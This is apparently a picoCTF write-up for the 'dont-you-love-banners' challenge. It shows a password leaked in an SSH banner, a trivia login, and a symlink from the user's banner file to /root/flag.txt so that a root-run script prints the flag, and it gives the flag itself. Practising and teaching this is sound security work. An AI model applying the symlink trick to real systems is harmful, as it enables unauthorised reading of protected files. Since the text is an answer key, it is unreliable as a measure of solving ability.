# dont-you-love-banners

AUTHOR: LOIC SHEMA / SYREAL

#### Description
___
Can you abuse the banner?

Additional details will be available after launching your [challenge instance](https://play.picoctf.org/practice/challenge/437?category=5&originalEvent=73&page=1).

The server has been leaking some crucial information on `tethys.picoctf.net 58916`. 

Use the leaked information to get to the server.

To connect to the running application use `nc tethys.picoctf.net 52095`. 

From the above information abuse the machine and find the flag in the /root directory.

#### Soln
___
netcat the leaked info:
```
> nc tethys.picoctf.net 58916

SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

go to the server and answer the questions:
```
> nc tethys.picoctf.net 51016

*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234

What is the top cyber security conference in the world?
defcon

the first hacker ever was known for phreaking(making free phone calls), who was it?
john draper
```

navigate to the root folder
```
player@challenge:~$ cd ../..

player@challenge:/$ ls
ls
bin   challenge  etc   lib    media  opt   root  sbin  sys  usr
boot  dev        home  lib64  mnt    proc  run   srv   tmp  var

player@challenge:/$ cd root

player@challenge:/root$ ls
flag.txt  script.py
```

accessing the flag:
```
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
```

checking script.py:
```
layer@challenge:/root$ cat script.py
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```


we can abuse the banner into prompting it to display the value of flag.txt in which we don't have access in. Use symlink by removing the original banner and link the new one with the flag:
```
player@challenge:/root$ rm /home/player/banner

player@challenge:/root$ ln -s /root/flag.txt /home/player/banner

```

relaunch the server:
```
> nc tethys.picoctf.net 51016
> 
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
```


